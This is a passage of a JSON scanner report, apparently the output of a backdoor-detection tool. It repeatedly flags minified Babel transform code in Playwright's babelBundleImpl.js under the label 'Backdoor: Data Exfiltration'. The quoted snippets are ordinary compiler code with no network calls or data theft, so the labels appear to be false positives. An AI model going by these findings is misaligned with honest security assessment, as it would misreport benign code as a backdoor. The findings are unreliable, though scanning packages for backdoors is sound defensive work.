                    "text": "(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(",
                    "rendered": {
                      "text": "(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(",
                      "markdown": "`(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpression\",hA),f=i&&Vy.default.hasType(this.get(\"callee.body\").node,\"YieldExpression\",hA);return c&&(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2362,
                  "endLine": 31,
                  "endColumn": 2367,
                  "snippet": {
                    "text": "ody\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpressio",
                    "rendered": {
                      "text": "ody\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpressio",
                      "markdown": "`ody\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"expressionReplacementReturnUid\",b)),p.get(\"expression\").replaceWith(EA(\"=\",$y(b),p.node.expression))}else p.replaceWith(yA(p.node.expression))}o.arrowFunctionToExpression();let u=o,c=s&&Vy.default.hasType(this.get(\"callee.body\").node,\"AwaitExpressio`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2114,
                  "endLine": 31,
                  "endColumn": 2119,
                  "snippet": {
                    "text": "{id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"e",
                    "rendered": {
                      "text": "{id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"e",
                      "markdown": "`{id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\"),o.get(\"body\").pushContainer(\"body\",yA($y(b))),m.setData(\"e`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2055,
                  "endLine": 31,
                  "endColumn": 2060,
                  "snippet": {
                    "text": "();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\")",
                    "rendered": {
                      "text": "();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\")",
                      "markdown": "`();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.generateDeclaredUidIdentifier(\"ret\")`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 2023,
                  "endLine": 31,
                  "endColumn": 2028,
                  "snippet": {
                    "text": "y]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.gene",
                    "rendered": {
                      "text": "y]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.gene",
                      "markdown": "`y]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(let p of l){if(!p.isExpressionStatement())continue;let m=p.findParent(b=>b.isLoop());if(m){let b=m.getData(\"expressionReplacementReturnUid\");b?b=$ie(b.name):(b=o.scope.gene`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 1851,
                  "endLine": 31,
                  "endColumn": 1856,
                  "snippet": {
                    "text": ",this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(",
                    "rendered": {
                      "text": ",this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(",
                      "markdown": "`,this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.node),this.node=this.container[this.key]=e}function aae(e){this.resync();let t=[],r=zu(e,t);if(r){for(let p of t)this.scope.push({id:p});return this.replaceWith(r)[0].get(\"expressions\")}let n=this.getFunctionParent(),s=n==null?void 0:n.is(\"async\"),i=n==null?void 0:n.is(\"generator\"),a=jie([],Mie(e));this.replaceWith(Rie(a,[]));let o=this.get(\"callee\");(0,Fie.default)(o.get(\"body\"),p=>{this.scope.push({id:p})},\"var\");let l=this.get(\"callee\").getCompletionRecords();for(`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 31,
                  "startColumn": 1382,
                  "endLine": 31,
                  "endColumn": 1387,
                  "snippet": {
                    "text": "is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.no",
                    "rendered": {
                      "text": "is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.no",
                      "markdown": "`is.isNodeType(\"Expression\")&&zie(t)&&!this.canHaveVariableDeclarationOrExpression()&&!this.canSwapBetweenExpressionAndStatement(t))return this.replaceExpressionWithStatements([t]);let n=this.node;return n&&(Gie(t,n),Zie(n)),this._replaceWith(t),this.type=t.type,this.setScope(),this.requeue(),[r?this.get(r):this]}function iae(e){var t;if(!this.container)throw new ReferenceError(\"Container is falsy\");this.inList?gA(this.parent,this.key,[e]):gA(this.parent,this.key,e),this.debug(`Replace with ${e==null?void 0:e.type}`),(t=(0,bA.getCachedPaths)(this.hub,this.parent))==null||t.set(e,this).delete(this.no`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 30,
                  "startColumn": 52596,
                  "endLine": 30,
                  "endColumn": 52601,
                  "snippet": {
                    "text": "rict\";Object.defineProperty(qy,\"__esModule\",{value:!0});qy.default=Oie;var Aie=De(),{assignmentExpression:Cie,expressionStatement:wie,identifier:Die}=Aie,Iie={Scope(e,t){t.kind===\"let\"&&e.skip()},FunctionParent(e){e.skip()},VariableDeclaration(e,t){if(t.kind&&e.node.kind!==t.kind)return;let r=[],n=e.get(\"declarations\"),s;for(let i of n){s=i.node.id,i.node.init&&r.push(wie(Cie(\"=\",i.node.id,i.node.init)));for(let a of Object.keys(i.getBindingIdentifiers()))t.emit(Die(a),a,i.node.init!==null)}e.parentPath.isFor({left:e.node})?e.replaceWith(s):e.replaceWithMultiple(r)}};function Oie(e,t,r=\"var\"){e.tra",
                    "rendered": {
                      "text": "rict\";Object.defineProperty(qy,\"__esModule\",{value:!0});qy.default=Oie;var Aie=De(),{assignmentExpression:Cie,expressionStatement:wie,identifier:Die}=Aie,Iie={Scope(e,t){t.kind===\"let\"&&e.skip()},FunctionParent(e){e.skip()},VariableDeclaration(e,t){if(t.kind&&e.node.kind!==t.kind)return;let r=[],n=e.get(\"declarations\"),s;for(let i of n){s=i.node.id,i.node.init&&r.push(wie(Cie(\"=\",i.node.id,i.node.init)));for(let a of Object.keys(i.getBindingIdentifiers()))t.emit(Die(a),a,i.node.init!==null)}e.parentPath.isFor({left:e.node})?e.replaceWith(s):e.replaceWithMultiple(r)}};function Oie(e,t,r=\"var\"){e.tra",
                      "markdown": "`rict\";Object.defineProperty(qy,\"__esModule\",{value:!0});qy.default=Oie;var Aie=De(),{assignmentExpression:Cie,expressionStatement:wie,identifier:Die}=Aie,Iie={Scope(e,t){t.kind===\"let\"&&e.skip()},FunctionParent(e){e.skip()},VariableDeclaration(e,t){if(t.kind&&e.node.kind!==t.kind)return;let r=[],n=e.get(\"declarations\"),s;for(let i of n){s=i.node.id,i.node.init&&r.push(wie(Cie(\"=\",i.node.id,i.node.init)));for(let a of Object.keys(i.getBindingIdentifiers()))t.emit(Die(a),a,i.node.init!==null)}e.parentPath.isFor({left:e.node})?e.replaceWith(s):e.replaceWithMultiple(r)}};function Oie(e,t,r=\"var\"){e.tra`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 7669,
                  "endLine": 29,
                  "endColumn": 7674,
                  "snippet": {
                    "text": "&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnProperty.call(e,t)&&e[t],uA=e=>e.type===\"ParenthesizedExpression\"?uA(e.expression):e,wy=class extends Py{toAssignable(t,r=!1){var n,s;let i;switch((t.type===\"ParenthesizedExpression\"||(n=t.extra)!=null&&n.parenthesized)&&(i=",
                    "rendered": {
                      "text": "&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnProperty.call(e,t)&&e[t],uA=e=>e.type===\"ParenthesizedExpression\"?uA(e.expression):e,wy=class extends Py{toAssignable(t,r=!1){var n,s;let i;switch((t.type===\"ParenthesizedExpression\"||(n=t.extra)!=null&&n.parenthesized)&&(i=",
                      "markdown": "`&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnProperty.call(e,t)&&e[t],uA=e=>e.type===\"ParenthesizedExpression\"?uA(e.expression):e,wy=class extends Py{toAssignable(t,r=!1){var n,s;let i;switch((t.type===\"ParenthesizedExpression\"||(n=t.extra)!=null&&n.parenthesized)&&(i=`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 7452,
                  "endLine": 29,
                  "endColumn": 7457,
                  "snippet": {
                    "text": "(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnPropert",
                    "rendered": {
                      "text": "(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnPropert",
                      "markdown": "`(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.scopeStack[s].tsNames.get(r);if((a&1)>0||(a&16)>0)return}super.checkLocalExport(t)}},rie=(e,t)=>hasOwnPropert`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 7345,
                  "endLine": 29,
                  "endColumn": 7350,
                  "snippet": {
                    "text": "t(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.sc",
                    "rendered": {
                      "text": "t(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.sc",
                      "markdown": "`t(t)||0;if(r&1024){this.maybeExportDefined(s,t),s.tsNames.set(t,i|16);return}super.declareName(t,r,n),r&2&&(r&1||(this.checkRedeclarationInScope(s,t,r,n),this.maybeExportDefined(s,t)),i=i|1),r&256&&(i=i|2),r&512&&(i=i|4),r&128&&(i=i|8),i&&s.tsNames.set(t,i)}isRedeclaredInScope(t,r,n){let s=t.tsNames.get(r);if((s&2)>0){if(n&256){let i=!!(n&512),a=(s&4)>0;return i!==a}return!0}return n&128&&(s&8)>0?t.names.get(r)&2?!!(n&1):!1:n&2&&(s&1)>0?!0:super.isRedeclaredInScope(t,r,n)}checkLocalExport(t){let{name:r}=t;if(this.hasImport(r))return;let n=this.scopeStack.length;for(let s=n-1;s>=0;s--){let a=this.sc`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 29,
                  "startColumn": 7042,
                  "endLine": 29,
                  "endColumn": 7047,
                  "snippet": {
